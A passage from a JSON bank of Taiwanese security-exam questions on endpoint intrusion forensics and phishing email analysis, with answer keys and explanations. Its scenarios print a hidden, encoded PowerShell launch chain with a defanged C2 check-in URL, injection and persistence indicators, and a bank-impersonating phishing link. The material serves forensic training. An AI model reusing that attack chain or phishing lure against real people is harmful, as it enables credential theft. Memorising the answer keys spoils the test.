     "explanation": "答案 A。Priority = Facility × 8 + Severity。96 ÷ 8 = 12 餘 0，Facility 12 是 NTP 子系統，Severity 0 就是 Emergency。B Error 是 3、C Warning 是 4、D Informational 是 6，換算起來分別對應 Priority 99、100、102，而非 96。",
     "source": "113-1 第26題"
    }
   ]
  },
  {
   "id": "2.1-06",
   "section": "2.1",
   "title": "端點入侵調查",
   "examHits": 5,
   "examRefs": [
    "115-2 第33題",
    "115-2 第34題",
    "115-2 第35題",
    "115-2 第36題",
    "108-1 第39題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "端點入侵調查像拼圖：看到『誰啟動誰』（程序樹、父子關係）、『什麼時候發生』（事件時間軸）、『記憶體裡有什麼』（記憶體鑑識）、『檔案本身是什麼』（副檔名不代表內容）。常見的 Office 釣魚攻擊鏈是：使用者開啟 Word 文件 → WINWORD.EXE 啟動 PowerShell（常搭配 Base64 編碼與 Bypass 參數）→ 載入 DLL 的 rundll32.exe → regsvr32.exe 對外連線；這些都是合法系統工具被濫用。判斷程序注入要看記憶體鑑識（malfind 找到 PAGE_EXECUTE_READWRITE 的可疑區段），不是只看父子關係或網路連線。Windows 事件 ID 4688 為程序建立、4104 為 PowerShell 指令碼區塊、7045 為新服務安裝、5156 為允許的網路連線。列出執行中程式用 tasklist 或 Get-Process，netstat 看的是連線。",
   "keyPoints": [
    "程序樹要從根往下讀：explorer → WINWORD → powershell → rundll32 → regsvr32 才是初始執行鏈；服務建立（7045）發生在鏈的中段，是持久化而非起點。",
    "判斷是否有程序注入 → 看 malfind 顯示的 PAGE_EXECUTE_READWRITE 可疑記憶體區段；父子關係與對外連線只是旁證，不能單獨證明注入。",
    "副檔名不等於檔案類型：update.dat 的 PE 類型是 DLL，且含注入、反除錯、持久化（Run 機碼）、通訊字串，要視為可疑可執行元件。",
    "寫風險敘述時，不可因為起點是合法程式（explorer、Word）或服務名稱像 Windows Update 就判定正常；封鎖單一網域也不等於主機已安全。",
    "列出執行中程式：cmd 的 tasklist、PowerShell 的 Get-Process（PowerShell 也能執行 tasklist）；netstat 主要看連線與連接埠。"
   ],
   "trap": "只看某個單點證據就下結論（例如以 Event ID 7045 或對外連線就說已證明注入，或因起點是 Office 就說是正常外掛）；另外 netstat 常被誤當成可列出程式的指令。",
   "quiz": [
    {
     "stem": "情境如附圖所示，根據圖中的程序樹與事件時間軸，下列哪一項最合理地描述此事件的初始執行鏈？",
     "options": [
      "使用者開啟Word文件後，WINWORD.EXE 觸發PowerShell，PowerShell 再啟動 rundll32.exe載入可疑 DLL，後續出現regsvr32.exe對外連線",
      "WinUpdateSvc服務建立於09:12:46，因此可推論它是最早觸發整個程序鏈的來源",
      "explorer.exe啟動 WINWORD.EXE屬於正常使用者操作，因此後續所有子程序都應視為Office正常外掛行為",
      "regsvr32.exe對外連線後觸發rundll32.exe，再由rundll32.exe開啟PowerShell，最後啟動Word文件"
     ],
     "answer": 0,
     "context": "某企業進行年度資安健診時，SOC 團隊發現一台財務部門的 Windows 10 工作站出現異常行為。該主機曾對外部未知網域建立 HTTPS 連線，且端點偵測系統顯示多個可疑程序被連續啟動。資安團隊進一步蒐集端點紀錄、可疑檔案資訊與記憶體鑑識結果，整理成以下調查摘要圖。\n\n[Endpoint Investigation Summary]\n\nHost: FIN-WKS-023\nIP: 10.10.24.55\nUser: finance_user\nOS: Windows 10\n\nProcess Tree\nexplorer.exe\n└─ WINWORD.EXE\n   └─ powershell.exe\n      CommandLine:\n      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aW1wb3J0IG9zCmltcG9hft\n      └─ rundll32.exe\n         Loaded File:\n         C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\n         └─ regsvr32.exe\n            Network:\n            hxxps://cdn-update-check[.]com/api/v2/checkin\n\nSuspicious File: update.dat\nPath: C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\nFile Type: PE DLL\nDigital Signature: Not signed\nInteresting Strings:\nVirtualAlloc\nWriteProcessMemory\nCreateRemoteThread\nIsDebuggerPresent\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\ncdn-update-check.com\nPOST /api/v2/checkin\nMozilla/5.0\n\nEvent Timeline\n09:12:31 Event ID 4688\n    WINWORD.EXE created powershell.exe\n09:12:34 Event ID 4104\n    PowerShell ScriptBlock contains FromBase64String\n09:12:39 Event ID 4688\n    powershell.exe created rundll32.exe\n09:12:46 Event ID 7045\n    New service created: WinUpdateSvc\n09:13:08 Event ID 5156\n    regsvr32.exe connected to external IP over TCP/443\n\nMemory Forensics Summary\npslist:\nPID 4820 WINWORD.EXE PPID 3912\nPID 5168 powershell.exe PPID 4820\nPID 5384 rundll32.exe PPID 5168\nPID 5520 regsvr32.exe PPID 5384\n\nnetscan:\nPID 5520 regsvr32.exe\n10.10.24.55:49722 -> 185.199.X.X:443\nState: ESTABLISHED\n\nmalfind:\nPID 5384 rundll32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region\n\nPID 5520 regsvr32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region",
     "hint": "父子關係的箭頭方向決定誰是起點。請以 pslist 的 PPID 與事件時間軸互相對照，從最上層一路往下排。",
     "explanation": "答案 A。依程序樹與時間軸：09:12:31 WINWORD.EXE 建立 powershell.exe、09:12:39 powershell.exe 建立 rundll32.exe（載入 update.dat）、regsvr32.exe 為 rundll32.exe 之子程序並對外連線。B 服務 WinUpdateSvc 是 09:12:46 才建立，屬中段的持久化行為，不是起點；C explorer 啟動 Word 雖是常見操作，但 Word 之後衍生 PowerShell 並用 Base64 編碼指令，不是正常外掛行為；D 方向完全顛倒，父子關係（PPID）顯示是 Word 啟動 PowerShell，而不是反過來。",
     "source": "115-2 第33題"
    },
    {
     "stem": "情境如附圖所示，關於update.dat 的初步分析，下列哪一項判斷最適當？",
     "options": [
      "update.dat 的副檔名不是 .dll，所以即使PE Header顯示為 DLL，也不應視為可執行元件",
      "update.dat 含有 Mozilla/5.0 與 POST /api/v2/checkin，因此只能判斷它與網頁瀏覽有關",
      "update.dat位於使用者暫存目錄，因此一定是瀏覽器或 Office自動產生的暫存檔",
      "update.dat 雖以 .dat 命名，但檔案型態為 PE DLL，且同時出現程序注入、反除錯、持久化與網路通訊相關字串"
     ],
     "answer": 3,
     "context": "某企業進行年度資安健診時，SOC 團隊發現一台財務部門的 Windows 10 工作站出現異常行為。該主機曾對外部未知網域建立 HTTPS 連線，且端點偵測系統顯示多個可疑程序被連續啟動。資安團隊進一步蒐集端點紀錄、可疑檔案資訊與記憶體鑑識結果，整理成以下調查摘要圖。\n\n[Endpoint Investigation Summary]\n\nHost: FIN-WKS-023\nIP: 10.10.24.55\nUser: finance_user\nOS: Windows 10\n\nProcess Tree\nexplorer.exe\n└─ WINWORD.EXE\n   └─ powershell.exe\n      CommandLine:\n      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aW1wb3J0IG9zCmltcG9hft\n      └─ rundll32.exe\n         Loaded File:\n         C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\n         └─ regsvr32.exe\n            Network:\n            hxxps://cdn-update-check[.]com/api/v2/checkin\n\nSuspicious File: update.dat\nPath: C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\nFile Type: PE DLL\nDigital Signature: Not signed\nInteresting Strings:\nVirtualAlloc\nWriteProcessMemory\nCreateRemoteThread\nIsDebuggerPresent\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\ncdn-update-check.com\nPOST /api/v2/checkin\nMozilla/5.0\n\nEvent Timeline\n09:12:31 Event ID 4688\n    WINWORD.EXE created powershell.exe\n09:12:34 Event ID 4104\n    PowerShell ScriptBlock contains FromBase64String\n09:12:39 Event ID 4688\n    powershell.exe created rundll32.exe\n09:12:46 Event ID 7045\n    New service created: WinUpdateSvc\n09:13:08 Event ID 5156\n    regsvr32.exe connected to external IP over TCP/443\n\nMemory Forensics Summary\npslist:\nPID 4820 WINWORD.EXE PPID 3912\nPID 5168 powershell.exe PPID 4820\nPID 5384 rundll32.exe PPID 5168\nPID 5520 regsvr32.exe PPID 5384\n\nnetscan:\nPID 5520 regsvr32.exe\n10.10.24.55:49722 -> 185.199.X.X:443\nState: ESTABLISHED\n\nmalfind:\nPID 5384 rundll32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region\n\nPID 5520 regsvr32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region",
     "hint": "逐項檢查每個判斷依據的證據是否充分、推論是否合理。",
     "explanation": "答案 D。update.dat 雖然副檔名是 .dat，但檔案類型為 PE DLL、未簽章，且字串含 VirtualAlloc／WriteProcessMemory／CreateRemoteThread（程序注入）、IsDebuggerPresent（反除錯）、Run 登錄機碼（持久化）、cdn-update-check.com 與 POST 路徑（通訊），綜合判斷是可疑惡意元件。A 副檔名不能決定是否可被載入執行，rundll32 就是載入了它；B Mozilla/5.0 只是偽裝成瀏覽器的 User-Agent，不能只據此判斷與瀏覽有關；C 位於使用者暫存目錄並不代表一定是瀏覽器或 Office 的暫存檔，反而是惡意程式常用的落地位置。",
     "source": "115-2 第34題"
    },
    {
     "stem": "情境如附圖所示，若調查人員要確認是否存在程序注入或記憶體中惡意程式碼執行跡象，下列哪一項證據最直接支持此判斷？",
     "options": [
      "Event ID 7045 顯示建立了 WinUpdateSvc 服務，因此可直接證明 regsvr32.exe 被注入",
      "netscan顯示regsvr32.exe對外部IP 建立TCP/443連線，代表發生程序注入",
      "pslist 顯示WINWORD.EXE、powershell.exe、rundll32.exe與regsvr32.exe的父子程序關係",
      "malfind顯示rundll32.exe與regsvr32.exe存在PAGE_EXECUTE_READWRITE的記憶體區段"
     ],
     "answer": 3,
     "context": "某企業進行年度資安健診時，SOC 團隊發現一台財務部門的 Windows 10 工作站出現異常行為。該主機曾對外部未知網域建立 HTTPS 連線，且端點偵測系統顯示多個可疑程序被連續啟動。資安團隊進一步蒐集端點紀錄、可疑檔案資訊與記憶體鑑識結果，整理成以下調查摘要圖。\n\n[Endpoint Investigation Summary]\n\nHost: FIN-WKS-023\nIP: 10.10.24.55\nUser: finance_user\nOS: Windows 10\n\nProcess Tree\nexplorer.exe\n└─ WINWORD.EXE\n   └─ powershell.exe\n      CommandLine:\n      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aW1wb3J0IG9zCmltcG9hft\n      └─ rundll32.exe\n         Loaded File:\n         C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\n         └─ regsvr32.exe\n            Network:\n            hxxps://cdn-update-check[.]com/api/v2/checkin\n\nSuspicious File: update.dat\nPath: C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\nFile Type: PE DLL\nDigital Signature: Not signed\nInteresting Strings:\nVirtualAlloc\nWriteProcessMemory\nCreateRemoteThread\nIsDebuggerPresent\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\ncdn-update-check.com\nPOST /api/v2/checkin\nMozilla/5.0\n\nEvent Timeline\n09:12:31 Event ID 4688\n    WINWORD.EXE created powershell.exe\n09:12:34 Event ID 4104\n    PowerShell ScriptBlock contains FromBase64String\n09:12:39 Event ID 4688\n    powershell.exe created rundll32.exe\n09:12:46 Event ID 7045\n    New service created: WinUpdateSvc\n09:13:08 Event ID 5156\n    regsvr32.exe connected to external IP over TCP/443\n\nMemory Forensics Summary\npslist:\nPID 4820 WINWORD.EXE PPID 3912\nPID 5168 powershell.exe PPID 4820\nPID 5384 rundll32.exe PPID 5168\nPID 5520 regsvr32.exe PPID 5384\n\nnetscan:\nPID 5520 regsvr32.exe\n10.10.24.55:49722 -> 185.199.X.X:443\nState: ESTABLISHED\n\nmalfind:\nPID 5384 rundll32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region\n\nPID 5520 regsvr32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region",
     "hint": "逐項回想每種證據或工具輸出能證明什麼，判斷哪一項最直接支持程序注入的判斷。",
     "explanation": "答案 D。malfind 找到 rundll32.exe（PID 5384）與 regsvr32.exe（PID 5520）具有 PAGE_EXECUTE_READWRITE 的可疑注入記憶體區段，是記憶體中有程式碼被注入或執行的最直接證據。A Event ID 7045 只表示新服務被建立，不能直接證明某程序被注入；B netscan 顯示對外 TCP/443 連線，只能說明有網路通訊；C pslist 的父子關係只呈現程序鏈，不是注入的證據。",
     "source": "115-2 第35題"
    },
    {
     "stem": "情境如附圖所示，綜合圖中資訊，若要撰寫資安健診報告中的「主要風險敘述」，下列哪些最「不」恰當？",
     "options": [
      "該事件應判定為正常 Office 文件開啟流程，因為起點是 explorer.exe 與 WINWORD.EXE，兩者皆為合法Windows 與Office程序",
      "該主機疑似遭惡意文件觸發腳本執行，後續使用 PowerShell、rundll32.exe 與 regsvr32.exe等合法系統工具執行可疑活動",
      "該事件的主要風險僅限於外部HTTPS 連線，若封鎖cdn-update-check[.]com 後，即可判定主機已完全恢復安全",
      "該事件應優先歸類為Windows Update異常，因為服務名稱為WinUpdateSvc，且連線使用TCP/443，符合一般更新流量特徵"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "context": "某企業進行年度資安健診時，SOC 團隊發現一台財務部門的 Windows 10 工作站出現異常行為。該主機曾對外部未知網域建立 HTTPS 連線，且端點偵測系統顯示多個可疑程序被連續啟動。資安團隊進一步蒐集端點紀錄、可疑檔案資訊與記憶體鑑識結果，整理成以下調查摘要圖。\n\n[Endpoint Investigation Summary]\n\nHost: FIN-WKS-023\nIP: 10.10.24.55\nUser: finance_user\nOS: Windows 10\n\nProcess Tree\nexplorer.exe\n└─ WINWORD.EXE\n   └─ powershell.exe\n      CommandLine:\n      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aW1wb3J0IG9zCmltcG9hft\n      └─ rundll32.exe\n         Loaded File:\n         C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\n         └─ regsvr32.exe\n            Network:\n            hxxps://cdn-update-check[.]com/api/v2/checkin\n\nSuspicious File: update.dat\nPath: C:\\Users\\finance_user\\AppData\\Local\\Temp\\update.dat\nFile Type: PE DLL\nDigital Signature: Not signed\nInteresting Strings:\nVirtualAlloc\nWriteProcessMemory\nCreateRemoteThread\nIsDebuggerPresent\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\ncdn-update-check.com\nPOST /api/v2/checkin\nMozilla/5.0\n\nEvent Timeline\n09:12:31 Event ID 4688\n    WINWORD.EXE created powershell.exe\n09:12:34 Event ID 4104\n    PowerShell ScriptBlock contains FromBase64String\n09:12:39 Event ID 4688\n    powershell.exe created rundll32.exe\n09:12:46 Event ID 7045\n    New service created: WinUpdateSvc\n09:13:08 Event ID 5156\n    regsvr32.exe connected to external IP over TCP/443\n\nMemory Forensics Summary\npslist:\nPID 4820 WINWORD.EXE PPID 3912\nPID 5168 powershell.exe PPID 4820\nPID 5384 rundll32.exe PPID 5168\nPID 5520 regsvr32.exe PPID 5384\n\nnetscan:\nPID 5520 regsvr32.exe\n10.10.24.55:49722 -> 185.199.X.X:443\nState: ESTABLISHED\n\nmalfind:\nPID 5384 rundll32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region\n\nPID 5520 regsvr32.exe\nProtection: PAGE_EXECUTE_READWRITE\nNote: Suspicious injected memory region",
     "hint": "逐項拿每句敘述與附圖的完整證據比對，判斷是否恰當。",
     "explanation": "答案 A、C、D（最不恰當的敘述）。A 判定為正常 Office 開啟流程，忽略了 Word 後續衍生 PowerShell、載入未簽章 DLL、記憶體注入等異常，不恰當；C 認為風險僅限外部 HTTPS 連線、封鎖該網域就判定主機完全安全，忽略已有注入、持久化與落地檔案，不恰當；D 因服務名稱含 Update、使用 TCP/443 就歸類為 Windows Update 異常，是被偽裝名稱誤導，不恰當。B 描述『惡意文件觸發腳本，後續濫用 PowerShell、rundll32、regsvr32 等合法系統工具』，符合證據，是恰當的敘述，因此不選。",
     "source": "115-2 第36題"
    },
    {
     "stem": "上述情境中，若資安人員確認此一現象可能是駭客入侵或電腦遭惡意程式感染，故進一步檢查電腦應用程式執行狀態，發現有一不明程式常駐在電腦中執行，下列何者「不」能列出目前windows 電腦中正在運行的程式？（請勿考量windows 版本問題）",
     "options": [
      "在command line(cmd)中執行tasklist 指令",
      "在command line(cmd)中執行netstat -a指令",
      "在Powershell 中執行get-process 指令",
      "在Powershell 中執行tasklist 指令"
     ],
     "answer": 1,
     "context": "（題組題 5）\n某日資安人員接獲通報，系統維運人員在某台 windows 主機上找到一個文字檔（acc.txt）內容如下，因為發現文字檔案 \"Name\" 欄位的資料與電腦帳號是雷同的，資安人員發現此文字檔中，含有該台主機之 administrator 權限的帳號\n\nName      SID\n-----     ------\nXuser     S-1-5-21-3912933555-2805578987-3153105539-500\nGuset     S-1-5-21-3912933555-2805578987-3153105539-501\nkrbtgt    S-1-5-21-3912933555-2805578987-3153105539-502\nParis     S-1-5-21-3912933555-2805578987-3153105539-513\nJason     S-1-5-21-3912933555-2805578987-3153105539-1001\nTom       S-1-5-21-3912933555-2805578987-3153105539-1012",
     "hint": "逐項回想每個指令的用途與輸出內容。",
     "explanation": "答案 B（不能列出執行中程式）。netstat -a 顯示的是所有連線與監聽連接埠，並不會列出正在執行的程式清單（要顯示相關程式需另加參數）。A tasklist 與 C Get-Process 都能列出執行中的程序；D tasklist 是可執行檔，在 PowerShell 中同樣可以執行並列出程序。",
     "source": "108-1 第39題"
    }
   ]
  },
  {
   "id": "2.1-07",
   "section": "2.1",
   "title": "釣魚郵件與惡意網址鑑識",
   "examHits": 4,
   "examRefs": [
    "115-1 第5題",
    "115-1 第6題",
    "115-1 第7題",
    "115-1 第8題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "收到可疑信件，鑑識的重點是：信是真的從那裡寄來的嗎？寄件者能被驗證嗎？連結安不安全？看標頭要從最底下的 Received 往上讀（最下面是最早的一跳），私有位址（10.x、192.168.x）只代表內部轉送，不能當成原始寄件者 IP，原始來源要看更早的 Received 或 X-Originating-IP。SPF softfail、DKIM no signature 是『來源無法被驗證』的警訊，但不等於一定是惡意：處置是驗證來源並檢查其他可疑跡象，而不是自動信任，也不是一概刪除。可疑網址用 VirusTotal 等工具分析、用 WHOIS 查網域註冊日期與註冊商；被判定為惡意時，立即在公司網路封鎖並通知同仁不要點擊。千萬不要自己點開驗證，也不要只靠頂級網域（如 .sbs）判定安全或危險。",
   "keyPoints": [
    "看標頭 Received → 內部私有 IP 只是轉送節點，不是原始寄件者；原始來源要追更早的 Received／X-Originating-IP，攻擊者也可能偽造。",
    "SPF softfail、DKIM no signature → 來源無法驗證，要進一步驗證與檢查可疑跡象；不可自動信任，也不是只憑這點就斷定一定惡意。",
    "網址被威脅情資工具判為惡意 → 在公司網路封鎖＋通知相關人員，不要自己點、不要加白名單、不要忽略。",
    "安全地驗證網址：WHOIS／DNS 查註冊資訊、VirusTotal 等 URL 檢測、沙箱；不要用自己的工作電腦點開，也不要憑頂級網域直接下結論。",
    "處置邏輯：先驗證 → 再封鎖與通報 → 再清查是否有人已點擊並做重設密碼等補救。"
   ],
   "trap": "把私有 IP 當成原始寄件者 IP；把 DKIM 無簽章或 SPF softfail 解讀成『一定是惡意』或『沒關係可以信任』；以為點進去看看最準。",
   "quiz": [
    {
     "stem": "情境如附圖所示。關於信件中出現Received: from 10.0.1.7的本地IP地址，下列何項敘述最為適切？",
     "options": [
      "此IP為原始發信者IP",
      "攻擊者可能隱藏其實際來源",
      "本地IP位址保證了信件的安全性",
      "信件已通過多重身份驗證"
     ],
     "answer": 1,
     "context": "網路詐騙十分猖獗，公司一位高階主管，被一封釣魚信件欺騙（圖一），點擊信件中的連結，並且連結 C2 中繼站，植入惡意程式，竊取該位主管瀏覽器的帳號與密碼，其中包含了連接公司 Exchange 帳號與密碼…趕緊尋求公司資安部門進行鑑識分析，結果從信件標頭及詳細資訊發現到以下資訊（圖二），身為資安事件威脅攻擊之鑑識人員你（妳），請依據這兩項鑑識資訊，回答本題組之相關問題。\n\n圖一（釣魚信件畫面）\n來源：三井住友カード株式会社 <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\n收信：victim@（遮蔽）.com.tw\n標題：「口座取引制限のお知らせ：Vpass情報の更新が必要です●QB-51454758593\nSUMITOMO MITSUI BANKING CORPORATION\n（圖片文字）回答が完了しますと通常どおりログイン後のお手続きが可能になります\n［Vpass情報を更新する］ https://move-smbc-co.sbs/vpass\n※一定期間ご確認いただけない場合、口座取引を制限させていただきます。\n■発行者 三井住友カード株式会社 〒135-0061 東京都江東区豊洲2丁目2番31号 SMBC豊洲ビル\nお問い合わせはこちら ※本メールの返信用アドレスは配信専用です。\n三井住友カードレターの登録内容変更・解除はこちら\n※お手続きには、Vpassへのログインが必要です。\n※変更・解除の反映までに1、2週間ほど時間がかかる場合があります。\nCopyright (C) Sumitomo Mitsui Card Co., Ltd. All rights reserved.\n\n圖二（郵件標頭）\nX-M2K-MATCHED-RULE: SPAM_FILTER-SPAM\nX-M2K-MATCHED-RESULT: Quarantine by Level: High\nX-TRACE-MSG-ID: S_67786E06000DD1362A23EC8E0000E016000165B4\nReceived: from 10.0.1.7\n    by gsv2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V7.00(57366:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:54 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2K-MSG-ID: 67786E062D1628BC\nReceived: from 10.0.1.7\n    by mx2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V4.00M(1185:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:52 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2KPolicyIP: 10.0.1.7 (#NOT FOUND)\nReceived: from spamfilter2.（遮蔽）.com.tw (localhost [127.0.0.1])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP id 967BB540AB3\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nReceived: from l4.（遮蔽）.com.tw (mta.（遮蔽）.com.tw [10.0.0.4])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nX-M2K-DINF: v=1;em=2;eh=1c343546/6OAINL;ec=e0c3cc29;m=ReK/s4+0ysZmw+oyf38QGbht\n    7IEuc1wrc0XaFOfDl4piRhskETTeW1b7vtteCRn3kdyegyr9DHClgD137iBm9v17WJWvfiu69dw1\nX-MG-ANTISPAM-RESULT: Yes/1040\nX-MailGates: (RBL:1,SPAM,165.154.234.197#sbl-xbl.spamhaus.org|bl.spamcop\n    .net:6.666667e-01)(SPF:1,SPAM,softfail)(BATV:2,PASS,sender not empty)(DK\n    :2,PASS,no signature)(DKIM:2,PASS,No signature(2))(GL:2,PASS,Valid recor\n    d)(IPF:2,PASS)(FROMBW:2,PASS)(FROMBW:2,PASS)(autowhite:NO_ACTION,2)\nX-MAILCLOUD-ANTISPAM-RESULT: Yes/1040\nReceived: from 165.154.234.197\n    by mta.（遮蔽）.com.tw with MailAudit ESMTP Server V5.0(9500:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>); Sat, 04 Jan 2025 07:08:51 +0800 (CST)\nReceived: from localhost (localhost [IPv6:::1])\n    by 10-52-169-76.localdomain (Postfix) with ESMTP id EC8105461991\n    for <victim@（遮蔽）.com.tw>; Fri,  3 Jan 2025 14:06:15 +0100 (WAT)\nMime-Version: 1.0\nList-Unsubscribe-Post: List-Unsubscribe=One-Click\nErrors-To: 9a38f1f8-6c115ef175b8@1d81dc8198.com\nDate: Fri, 03 Jan 2025 22:06:15 +0900\nTo: victim@（遮蔽）.com.tw\nSubject: =?UTF-8?q?=E3=80=8C=E5=8F=A3=E5=BA=A7=E5=8F=96=E5=BC=95=E5=88=B6=E9=99=90?=\nX-Originating-IP: [91.222.43.64]\nMessage-ID: <2025010384617949372959@de617.repica.jp>\nList-Unsubscribe: <mailto:32dfce0c62dfa07f0728@6c115ef175b8?subject=unsubscribe>\nMIME-Version: 1.0\nFrom: =?UTF-8?q?=E4=B8=89=E4=BA=95=E4=BD=8F=E5=8F=8B=E3=82=AB=E3=83=BC=E3=83=89?=\n <vpass_Net.Ab1victimA1@accounts（遮蔽）.com>\nContent-Type: multipart/alternative;\n boundary=399347129b2f13253edb8d3834c632ecce94a05d85bfda56f03bc3b744ab\nX-DCC-Body-Count: 1\nX-DCC-Fuz1-Count: 1\nX-DCC-Fuz2-Count: 1000000\nX-DCC--Metrics: spamfilter2.（遮蔽）.com.tw 1325; Body=1 Fuz1=1 Fuz2=many",
     "hint": "回想郵件 Received 標頭的記錄方式與私有 IP 的特性，逐項判斷每句敘述是否成立。",
     "explanation": "答案 B。Received: from 10.0.1.7 是私有 IP，只說明這是接收端內部的轉送節點，無法代表原始發信者；攻擊者也可能刻意隱藏或偽造經過的路徑，所以要追更早的 Received 或 X-Originating-IP。A 該 IP 並不是原始發信者；C 私有位址不代表信件安全；D 圖二的 SPF 為 softfail、DKIM 為 no signature，並沒有通過多重身分驗證。",
     "source": "115-1 第5題"
    },
    {
     "stem": "情境如附圖所示。從圖二資訊中，發現郵件來源的網域金鑰識別郵件（DomainKeys Identified Mail，DKIM）簽名為\"No signature\"時，應採取下列何項的對應行動最為適切合理？",
     "options": [
      "自動信任此郵件，因為DKIM 簽名不是必要的安全措施",
      "驗證信件來源，並檢查是否有其可疑疑慮",
      "立即刪除信件，因為這意味著信件一定是惡意的",
      "啟用防火牆來阻止所有與該域相關的通信"
     ],
     "answer": 1,
     "context": "網路詐騙十分猖獗，公司一位高階主管，被一封釣魚信件欺騙（圖一），點擊信件中的連結，並且連結 C2 中繼站，植入惡意程式，竊取該位主管瀏覽器的帳號與密碼，其中包含了連接公司 Exchange 帳號與密碼…趕緊尋求公司資安部門進行鑑識分析，結果從信件標頭及詳細資訊發現到以下資訊（圖二），身為資安事件威脅攻擊之鑑識人員你（妳），請依據這兩項鑑識資訊，回答本題組之相關問題。\n\n圖一（釣魚信件畫面）\n來源：三井住友カード株式会社 <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\n收信：victim@（遮蔽）.com.tw\n標題：「口座取引制限のお知らせ：Vpass情報の更新が必要です●QB-51454758593\nSUMITOMO MITSUI BANKING CORPORATION\n（圖片文字）回答が完了しますと通常どおりログイン後のお手続きが可能になります\n［Vpass情報を更新する］ https://move-smbc-co.sbs/vpass\n※一定期間ご確認いただけない場合、口座取引を制限させていただきます。\n■発行者 三井住友カード株式会社 〒135-0061 東京都江東区豊洲2丁目2番31号 SMBC豊洲ビル\nお問い合わせはこちら ※本メールの返信用アドレスは配信専用です。\n三井住友カードレターの登録内容変更・解除はこちら\n※お手続きには、Vpassへのログインが必要です。\n※変更・解除の反映までに1、2週間ほど時間がかかる場合があります。\nCopyright (C) Sumitomo Mitsui Card Co., Ltd. All rights reserved.\n\n圖二（郵件標頭）\nX-M2K-MATCHED-RULE: SPAM_FILTER-SPAM\nX-M2K-MATCHED-RESULT: Quarantine by Level: High\nX-TRACE-MSG-ID: S_67786E06000DD1362A23EC8E0000E016000165B4\nReceived: from 10.0.1.7\n    by gsv2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V7.00(57366:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:54 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2K-MSG-ID: 67786E062D1628BC\nReceived: from 10.0.1.7\n    by mx2.（遮蔽）.com.tw with （遮蔽） ESMTP Server V4.00M(1185:0:AUTH_NONE)\n    (envelope-from <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>); Sat, 04 Jan 2025 07:08:52 +0800 (CST)\nReturn-Path: <vpass_Net.Ab1victimA1@accounts.（遮蔽）.com>\nX-M2KPolicyIP: 10.0.1.7 (#NOT FOUND)\nReceived: from spamfilter2.（遮蔽）.com.tw (localhost [127.0.0.1])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP id 967BB540AB3\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nReceived: from l4.（遮蔽）.com.tw (mta.（遮蔽）.com.tw [10.0.0.4])\n    by spamfilter2.（遮蔽）.com.tw (Postfix) with ESMTP\n    for <victim@（遮蔽）.com.tw>; Sat,  4 Jan 2025 07:08:52 +0800 (CST)\nX-M2K-DINF: v=1;em=2;eh=1c343546/6OAINL;ec=e0c3cc29;m=ReK/s4+0ysZmw+oyf38QGbht\n    7IEuc1wrc0XaFOfDl4piRhskETTeW1b7vtteCRn3kdyegyr9DHClgD137iBm9v17WJWvfiu69dw1\nX-MG-ANTISPAM-RESULT: Yes/1040\nX-MailGates: (RBL:1,SPAM,165.154.234.197#sbl-xbl.spamhaus.org|bl.spamcop\n    .net:6.666667e-01)(SPF:1,SPAM,softfail)(BATV:2,PASS,sender not empty)(DK\n    :2,PASS,no signature)(DKIM:2,PASS,No signature(2))(GL:2,PASS,Valid recor\n    